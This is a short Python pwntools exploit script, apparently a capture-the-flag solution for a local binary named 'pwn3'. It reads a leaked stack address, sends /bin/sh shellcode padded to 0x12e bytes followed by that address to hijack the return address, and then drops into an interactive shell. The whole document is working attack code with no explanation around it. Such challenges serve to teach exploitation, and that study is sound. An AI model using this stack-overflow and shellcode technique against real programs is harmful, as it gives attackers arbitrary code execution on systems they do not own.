from pwn import *

target = process("./pwn3")

target.recvuntil(b"journey ")

leak = target.recvline().strip(b"!\n")

print(leak)

buffer_addr = int(leak, 16)

shellcode = asm(shellcraft.sh())

padding = b"0"*(0x12e - len(shellcode))

target.sendline(shellcode + padding + p32(buffer_addr))

target.interactive()